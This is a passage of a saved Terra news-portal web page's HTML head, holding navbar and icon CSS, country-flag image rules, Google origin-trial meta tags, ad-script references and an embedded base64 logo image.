		.zaz--standalone .nb-back-history .lbl-text {
			margin-top: 11px;
			font: 14px OpenSans, sans-serif;
			display: block;
			margin-left: 0;
			float: left;
			font-weight: 600;
			color: #f1f1f1 !important
		}

		.splash-loader {
			position: fixed;
			top: 42px;
			height: 100%;
			width: 100%;
			background-color: #fff;
			z-index: 9999;
			-webkit-animation: set-timeout 15s linear forwards;
			animation: set-timeout 15s linear forwards
		}

		.spinner {
			margin: 100px auto 0;
			width: 70px;
			text-align: center
		}

		.spinner>div {
			width: 18px;
			height: 18px;
			background-color: #333;
			border-radius: 100%;
			display: inline-block;
			-webkit-animation: sk-bouncedelay 1.4s 1 ease-in-out both;
			animation: sk-bouncedelay 1.4s infinite ease-in-out both
		}

		.spinner .bounce1 {
			-webkit-animation-delay: -.32s;
			animation-delay: -.32s
		}

		.spinner .bounce2 {
			-webkit-animation-delay: -.16s;
			animation-delay: -.16s
		}

		.nightmode .splash-loader {
			background-color: #191917
		}

		.nightmode .spinner>div {
			background-color: #f1f1f1
		}

		.zaz--standalone .zaz__loader {
			width: 32px;
			height: 32px;
			display: inline-block;
			background: url("//s1.trrsf.com/update-1471016724/fe/zaz-icons/gif/loader.gif");
			background-repeat: no-repeat;
			background-position: center center
		}

		.zaz--standalone #zaz-app-navbar {
			overflow: visible
		}

		.zaz--standalone .nb-plugins--right {
			padding-top: 20px
		}

		.nb-panel-opened,
		.nb-shortcuts-opened {
			overflow: hidden
		}

		[itemtype="http://schema.org/NewsArticle"] .zaz--standalone #zaz-nb-plugin-ad {
			margin-top: 125px
		}

		[itemtype="http://schema.org/NewsArticle"] .zaz--standalone #zaz-nb-plugin-ad iframe {
			top: 0;
			bottom: 0;
			left: 0;
			right: 0;
			margin: auto
		}

		[data-device-type=mob] [itemtype="http://schema.org/NewsArticle"] .zaz--standalone #zaz-nb-plugin-ad {
			margin-top: 40px
		}

		.nb__logo {
			margin-top: 8px;
			text-indent: -99999px
		}

		.go_to_gray_darket24 {
			background-repeat: no-repeat;
			padding-bottom: 27px
		}

		.no-overflow {
			overflow: hidden
		}

		.no-overflow-mob .container-footer {
			display: none
		}

		#zaz-nb-plugin-menuBtn {
			cursor: pointer
		}

		#trr-globalnav-seo {
			display: none
		}

		.animation-swing {
			transform-origin: top center;
			animation-name: animation-swing;
			animation-duration: 500ms;
			animation-fill-mode: both;
			animation-iteration-count: 5
		}

		@media all and (-ms-high-contrast:none),
		(-ms-high-contrast:active) {
			.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li .content-central .container-ds .main.vendas .content {
				display: none
			}
		}

		@media only screen and (min-width:48em) {

			#zaz-nb-plugin-sva-mob .col-sm-12-app-n,
			#zaz-nb-plugin-sva-mob .col-sm-6-app-n,
			#zaz-nb-plugin-sva-mob .col-sm-app-n {
				box-sizing: border-box;
				-ms-flex: 0 0 auto;
				-webkit-box-flex: 0;
				flex: 0 0 auto
			}

			#zaz-nb-plugin-sva-mob .col-sm-app-n {
				-webkit-flex-grow: 1;
				-ms-flex-positive: 1;
				-webkit-box-flex: 1;
				flex-grow: 1;
				-ms-flex-preferred-size: 0;
				flex-basis: 0;
				max-width: 100%
			}

			#zaz-nb-plugin-sva-mob .col-sm-6-app-n {
				-ms-flex-preferred-size: 50%;
				flex-basis: 50%;
				max-width: 50%
			}

			#zaz-nb-plugin-sva-mob .col-sm-12-app-n {
				-ms-flex-preferred-size: 100%;
				flex-basis: 100%;
				max-width: 100%
			}
		}

		@media (max-width:371px) and (min-width:319px) {
			.zaz--standalone [data-small-search=visible] #zaz-nb-plugin-search {
				display: block
			}

			.zaz--standalone [data-small-search=visible] .za-search-component {
				position: absolute;
				background-color: #ff7212;
				width: 315px
			}
		}

		@media (min-width:992px) {
			#zaz--app-navbar-relative-container.zaz--standalone {
				margin-top: 60px
			}
		}

		@media (min-width:1100px) {
			.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li {
				padding: 0 14px
			}
		}

		@media (min-width:1200px) {
			#zaz-nb-plugin-sva-mob .openMenu .carousel-sva .slides>div .tag-oferta {
				top: -23px;
				left: 72px
			}
		}

		@media (min-width:1280px) {
			.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li {
				padding: 0 20px
			}
		}

		@media (min-width:1300px) {
			.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li.sva-adicional {
				display: block
			}

			.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li.sva-adicional a {
				display: flex;
				align-items: center
			}

			.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li.sva-adicional a .icon-15 {
				background-size: 15px auto;
				width: 15px;
				height: 15px
			}

			.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li.sva-adicional a .text {
				font-family: Ubuntu;
				text-transform: uppercase;
				padding-left: 7px;
				font-weight: 700;
				color: #1b7fc8
			}

			.zaz--standalone .zaz-sva-container #barrads #menu-DS ul li.sva-adicional a .tag {
				background-image: url("https://p1.trrsf.com.br/image/fget/cf/0/0/0/0/0/0/svadata.terra.com.br/svabar-navbar/promotags/img/tag_oferta.gif");
				display: block;
				background-repeat: no-repeat;
				background-size: 66px auto;
				position: absolute;
				bottom: -28px;
				right: 0;
				width: 66px;
				height: 40px
			}

			.zaz--standalone .zaz-sva-container #barrads #fixedspace ul .sva-adicional {
				display: block
			}

			.zaz--standalone .zaz-sva-container #barrads #fixedspace ul .sva-adicional a {
				display: flex;
				align-items: center;
				text-decoration: none;
				font-size: 14px
			}

			.zaz--standalone .zaz-sva-container #barrads #fixedspace ul .sva-adicional a .icon-15 {
				background-size: 15px auto;
				width: 15px;
				height: 15px
			}

			.zaz--standalone .zaz-sva-container #barrads #fixedspace ul .sva-adicional a .text {
				font-family: Ubuntu;
				text-transform: uppercase;
				padding-left: 7px;
				font-weight: 700;
				color: #1b7fc8
			}

			.zaz--standalone .zaz-sva-container #barrads #fixedspace ul .sva-adicional a .tag {
				background-image: url("https://p1.trrsf.com.br/image/fget/cf/0/0/0/0/0/0/svadata.terra.com.br/svabar-navbar/promotags/img/tag_oferta.gif");
				display: block;
				background-repeat: no-repeat;
				background-size: 66px auto;
				position: absolute;
				bottom: -31px;
				right: 0;
				width: 66px;
				height: 14px
			}
		}

		@media (max-width:1400px) and (min-width:1140px) {
			.zaz--standalone .nb-top .nb__logo {
				left: -125px
			}
		}

		@media (min-width:1500px) {
			.zaz--standalone #cursoDS .sva-destaque {
				width: 1333px;
				margin-left: 0
			}

			.zaz--standalone #cursoDS .sva-destaque .itens-menu ul li.hide-m {
				display: block
			}
		}

		@media (min-width:1600px) {
			.zaz--standalone #cursoDS {
				width: 1600px
			}
		}

		@media (max-width:1435px) {
			.zaz--standalone .nb-disclaimer-msg {
				max-width: 915px
			}
		}

		@media (max-width:1140px) {
			.zaz--standalone .nb-subscribe {
				display: none
			}
		}

		@media (max-width:768px) {
			.zaz--standalone #zaz-nb-plugin-search {
				display: none
			}

			.zaz--standalone .nb-plugin.nb-menuIcon.arrowOn+#zaz-nb-plugin-search {
				display: block
			}
		}

		@media only screen and (max-width:768px) {

			.nb-menuIcon:active,
			.nb-menuIcon:hover {
				opacity: 1
			}
		}

		@media only screen and (max-width:660px) {
			.nb-menuIcon .lbl-text {
				display: none
			}
		}

		@keyframes fadeIn {
			from {
				opacity: 1
			}

			to {
				opacity: 0;
				height: 1px;
				right: 10px
			}
		}

		@-webkit-keyframes sk-bouncedelay {

			0%,
			100%,
			80% {
				-webkit-transform: scale(0)
			}

			40% {
				-webkit-transform: scale(1)
			}
		}

		@keyframes sk-bouncedelay {

			0%,
			100%,
			80% {
				-webkit-transform: scale(0);
				transform: scale(0)
			}

			40% {
				-webkit-transform: scale(1);
				transform: scale(1)
			}
		}

		@-webkit-keyframes set-timeout {
			100% {
				left: -1000px
			}
		}

		@keyframes set-timeout {
			99% {
				left: 0
			}

			100% {
				left: -1000px
			}
		}

		@keyframes animation-swing {
			20% {
				transform: rotate3d(0, 0, 1, 15deg)
			}

			40% {
				transform: rotate3d(0, 0, 1, -10deg)
			}

			60% {
				transform: rotate3d(0, 0, 1, 5deg)
			}

			80% {
				transform: rotate3d(0, 0, 1, -5deg)
			}

			100% {
				transform: rotate3d(0, 0, 1, 0deg)
			}
		}

		/*# sourceURL=https://s1.trrsf.com/update-1608123948/fe/zaz-app-navbar/_css/navbarstandalone.min.css */
	</style>
	<meta http-equiv="origin-trial"
		content="A+b/H0b8RPXNaJgaNFpO0YOFuGK6myDQXlwnJB3SwzvNMfcndat4DZYMrP4ClJIzYWo3/yP2S+8FTZ/lpqbPAAEAAABueyJvcmlnaW4iOiJodHRwczovL2ltYXNkay5nb29nbGVhcGlzLmNvbTo0NDMiLCJmZWF0dXJlIjoiVHJ1c3RUb2tlbnMiLCJleHBpcnkiOjE2MjYyMjA3OTksImlzVGhpcmRQYXJ0eSI6dHJ1ZX0=">
	<meta http-equiv="origin-trial"
		content="A9ZgbRtm4pU3oZiuNzOsKcC8ppFSZdcjP2qYcdQrFKVzkmiWH1kdYY1Mi9x7G8+PS8HV9Ha9Cz0gaMdKsiVZIgMAAAB7eyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiVHJ1c3RUb2tlbnMiLCJleHBpcnkiOjE2MjYyMjA3OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9">
	<meta http-equiv="origin-trial"
		content="AxL6oBxcpn5rQDPKSAs+d0oxNyJYq2/4esBUh3Yx5z8QfcLu+AU8iFCXYRcr/CEEfDnkxxLTsvXPJFQBxHfvkgMAAACBeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXRhZ3NlcnZpY2VzLmNvbTo0NDMiLCJmZWF0dXJlIjoiVHJ1c3RUb2tlbnMiLCJleHBpcnkiOjE2MjYyMjA3OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9">
	<meta http-equiv="origin-trial"
		content="A9KPtG5kl3oLTk21xqynDPGQ5t18bSOpwt0w6kGa6dEWbuwjpffmdUpR3W+faZDubGT+KIk2do0BX2ca16x8qAcAAACBeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiVHJ1c3RUb2tlbnMiLCJleHBpcnkiOjE2MjYyMjA3OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9">
	<meta http-equiv="origin-trial"
		content="A3HucHUo1oW9s+9kIKz8mLkbcmdaj5lxt3eiIMp1Nh49dkkBlg1Fhg4Fd/r0vL69mRRA36YutI9P/lJUfL8csQoAAACFeyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiQ29udmVyc2lvbk1lYXN1cmVtZW50IiwiZXhwaXJ5IjoxNjI2MjIwNzk5LCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ==">
	<meta http-equiv="origin-trial"
		content="A0OysezhLoCRYomumeYlubLurZTCmsjTb087OvtCy95jNM65cfEsbajrJnhaGwiTxhz38ZZbm+UhUwQuXfVPTg0AAACLeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiQ29udmVyc2lvbk1lYXN1cmVtZW50IiwiZXhwaXJ5IjoxNjI2MjIwNzk5LCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ==">
	<meta http-equiv="origin-trial"
		content="AxoOxdZQmIoA1WeAPDixRAeWDdgs7ZtVFfH2y19ziTgD1iaHE5ZGz2UdSjubkWvob9C5PrjUfkWi4ZSLgWk3Xg8AAACLeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXRhZ3NlcnZpY2VzLmNvbTo0NDMiLCJmZWF0dXJlIjoiQ29udmVyc2lvbk1lYXN1cmVtZW50IiwiZXhwaXJ5IjoxNjI2MjIwNzk5LCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ==">
	<meta http-equiv="origin-trial"
		content="A7+rMYR5onPnACrz+niKSeFdH3xw1IyHo2AZSHmxrofRk9w4HcQPMYcpBUKu6OQ6zsdxf4m/vqa6tG6Na4OLpAQAAAB4eyJvcmlnaW4iOiJodHRwczovL2ltYXNkay5nb29nbGVhcGlzLmNvbTo0NDMiLCJmZWF0dXJlIjoiQ29udmVyc2lvbk1lYXN1cmVtZW50IiwiZXhwaXJ5IjoxNjI2MjIwNzk5LCJpc1RoaXJkUGFydHkiOnRydWV9">
	<meta http-equiv="origin-trial"
		content="AwfG8hAcHnPa/kJ1Co0EvG/K0F9l1s2JZGiDLt2mhC3QI5Fh4qmsmSwrWObZFbRC9ieDaSLU6lHRxhGUF/i9sgoAAACBeyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiSW50ZXJlc3RDb2hvcnRBUEkiLCJleHBpcnkiOjE2MjYyMjA3OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9">
	<meta http-equiv="origin-trial"
		content="AwQ7dCmHkvR6FuOFxAuNnktYSQrGbL4dF+eBkrwNLALc69Wr//PnO1yzns3pjUoCaYbKHtVcnng2hU+8OUm0PAYAAACHeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiSW50ZXJlc3RDb2hvcnRBUEkiLCJleHBpcnkiOjE2MjYyMjA3OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9">
	<meta http-equiv="origin-trial"
		content="AysVDPGQTLD/Scn78x4mLwB1tMfje5jwUpAAzGRpWsr1NzoN7MTFhT3ClmImi2svDZA7V6nWGIV8YTPsSRTe0wYAAACHeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXRhZ3NlcnZpY2VzLmNvbTo0NDMiLCJmZWF0dXJlIjoiSW50ZXJlc3RDb2hvcnRBUEkiLCJleHBpcnkiOjE2MjYyMjA3OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9">
	<script src="./index_files/pubads_impl_2021050601.js.baixados" async=""></script>
	<link rel="preload" href="./index_files/f.txt" as="script">
	<script type="text/javascript" src="./index_files/f.txt"></script>
	<link rel="preload" href="./index_files/f(1).txt" as="script">
	<script type="text/javascript" src="./index_files/f(1).txt"></script>
	<link rel="prefetch"
		href="https://49306cd524904b78c1c05b161fca9056.safeframe.googlesyndication.com/safeframe/1-0-38/html/container.html">
	<link rel="prefetch" href="https://tpc.googlesyndication.com/safeframe/1-0-38/html/container.html">
	<style type="text/css">
		.root-container.nb-container {
			position: fixed;
			top: 0;
			left: 0;
			width: 100%;
			margin: 0;
			z-index: 99000;
		}

		.root-container .zaz-app-nb-lock {
			position: absolute;
			top: 0;
			height: 100%;
			width: 0%;
			background: #ff7212;
			z-index: 999;
		}

		.root-container.nb-container[data-locked] .zaz-app-nb-lock {
			width: 100%;
		}

		.root-container .nb-plugins--left .zaz-app-nb-lock {
			left: 0;
		}

		.root-container .nb-plugins--right .zaz-app-nb-lock {
			right: 0;
		}

		.root-container .portal__container {
			position: relative;
			height: auto;
			margin-top: 0;
			overflow: hidden;
		}

		.root-container .nb-top {
			position: relative;
			height: 60px;
			background: #ff7212;
			overflow: hidden;
			transition: all linear 300ms;
			cursor: default;
			z-index: 99998;
		}

		.nb-top {
			height: 60px;
		}

		html[data-range='xsmall'] .nb-top,
		html[data-range='small'] .nb-top {
			height: 42px;
		}

		html[data-device-type="web"] .nb-top {
			height: 60px;
		}

		.root-container .nb-top .nb__logo {
			position: relative;
			top: 10px;
			width: 128px;
			height: 36px;
			display: block;
			margin: 0 auto;
			background-image: url('data:image/png;base64,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');
			background-size: 100% 100%;
		}

		html[data-range='xsmall'] .nb-top .nb__logo,
		html[data-range='small'] .nb-top .nb__logo {
			width: 85px;
			height: 25px;
			margin-top: 5px;
			margin-left: 5px;
			top: 0;
		}

		html[data-range='xsmall'] .nb__logo,
		html[data-range='small'] .nb__logo {
			float: left;
		}

		.root-container .nb-plugins--left {
			float: left;
			height: 100%;
		}

		html[data-device-type='web'] .nb-plugins--left,
		html[data-device-type='tab'] .nb-plugins--left {
			padding-top: 8px;
		}

		html[data-range='xsmall'] .nb-plugins--left,
		html[data-range='small'] .nb-plugins--left {
			padding-top: 0;
		}

		.root-container .nb-plugins--left .nb-plugin {
			float: left;
			height: 100%;
		}

		.root-container .nb-plugins--right {
			float: right;
			height: 100%;
		}

		html[data-range='xsmall'] .nb-plugins--right,
		html[data-range='small'] .nb-plugins--right {
			padding-top: 10px;
		}

		.root-container .nb-plugins--right .nb-plugin {
			float: right;
			height: 100%;
		}

		.root-container .nb-plugins--right .nb-plugin.nb__icon {
			margin: 0 10px;
		}

		.root-container .nb-plugin[data-plugin-state='off'] {
			display: none;
		}

		.root-container .nb-plugins__bottom {
			position: relative;
		}

		.root-container #trr-ctn-general {
			overflow-x: hidden;
		}

		#zaz-app-navbar,
		#zaz-app-navbar .nb__logo,
		#zaz-app-nb-plugs-right,
		#zaz-app-nb-plugs-left,
		#zaz--app-navbar-relative-container,
		.zaz-app-nb-lock {
			-webkit-transition: all linear 100ms;
			-moz-transition: all linear 100ms;
			-ms-transition: all linear 100ms;
			-o-transition: all linear 100ms;
			transition: all linear 100ms;
		}

		#zaz-app-navbar section {
			clear: none;
			width: auto;
		}
	</style>
	<style type="text/css">
		.zaz--standalone .icon {
			display: inline-block;
			background-repeat: no-repeat;
			background-position: 0
		}

		.zaz--standalone .icon-12 {
			background-size: 12px auto;
			width: 12px;
			height: 12px
		}

		.zaz--standalone .icon-16 {
			background-size: 16px auto;
			width: 16px;
			height: 16px
		}

		.zaz--standalone .icon-20 {
			background-size: 20px auto;
			width: 20px;
			height: 20px
		}

		.zaz--standalone .icon-24 {
			background-size: 24px auto;
			width: 24px;
			height: 24px
		}

		.zaz--standalone .icon-32 {
			background-size: 32px auto;
			width: 32px;
			height: 32px
		}

		.zaz--standalone .icon-40 {
			background-size: 40px auto;
			width: 40px;
			height: 40px
		}

		.zaz--standalone .icon-52 {
			background-size: 52px auto;
			width: 52px;
			height: 52px
		}

		.zaz--standalone .icon-64 {
			background-size: 64px auto;
			width: 64px;
			height: 64px
		}

		.zaz--standalone .icon-128 {
			background-size: 128px auto;
			width: 128px;
			height: 128px
		}

		.zaz--standalone .icon-256 {
			background-size: 256px auto;
			width: 256px;
			height: 256px
		}

		/*# sourceURL=https://s1.trrsf.com/update-1542656216/fe/zaz-mod-icons/_css/sizesstandalone.min.css */
	</style>
	<link rel="preload" href="./index_files/f.txt" as="script">
	<script type="text/javascript" src="./index_files/f.txt"></script>
	<link rel="preload" href="./index_files/f(1).txt" as="script">
	<script type="text/javascript" src="./index_files/f(1).txt"></script>
	<style type="text/css">
		.zaz--standalone .icon-flag-argelia {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-argelia.svg")
		}

		.zaz--standalone .icon-flag-argentina {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-argentina.svg")
		}

		.zaz--standalone .icon-flag-australia {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-australia.svg")
		}

		.zaz--standalone .icon-flag-belgium {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-belgium.svg")
		}

		.zaz--standalone .icon-flag-bosnia {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-bosnia.svg")
		}

		.zaz--standalone .icon-flag-brazil {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-brazil.svg")
		}

		.zaz--standalone .icon-flag-camaroon {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-camaroon.svg")
		}

		.zaz--standalone .icon-flag-chile {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-chile.svg")
		}

		.zaz--standalone .icon-flag-colombia {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-colombia.svg")
		}

		.zaz--standalone .icon-flag-costarica {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-costarica.svg")
		}

		.zaz--standalone .icon-flag-croacia {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-croacia.svg")
		}

		.zaz--standalone .icon-flag-ecuador {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-ecuador.svg")
		}

		.zaz--standalone .icon-flag-england {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-england.svg")
		}

		.zaz--standalone .icon-flag-france {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-france.svg")
		}

		.zaz--standalone .icon-flag-gana {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-gana.svg")
		}

		.zaz--standalone .icon-flag-germany {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-germany.svg")
		}

		.zaz--standalone .icon-flag-greece {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-greece.svg")
		}

		.zaz--standalone .icon-flag-holland {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-holland.svg")
		}

		.zaz--standalone .icon-flag-honduras {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-honduras.svg")
		}

		.zaz--standalone .icon-flag-iran {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-iran.svg")
		}

		.zaz--standalone .icon-flag-italy {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-italy.svg")
		}

		.zaz--standalone .icon-flag-ivorycoast {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-ivorycoast.svg")
		}

		.zaz--standalone .icon-flag-japan {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-japan.svg")
		}

		.zaz--standalone .icon-flag-mexico {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-mexico.svg")
		}

		.zaz--standalone .icon-flag-nigeria {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-nigeria.svg")
		}

		.zaz--standalone .icon-flag-peru {
			background-image: url("https://s1.trrsf.com/update-1619184651/fe/zaz-mod-icons/svg/flags/flag-peru.svg")
		}

		.zaz--standalone .icon-flag-portugal {
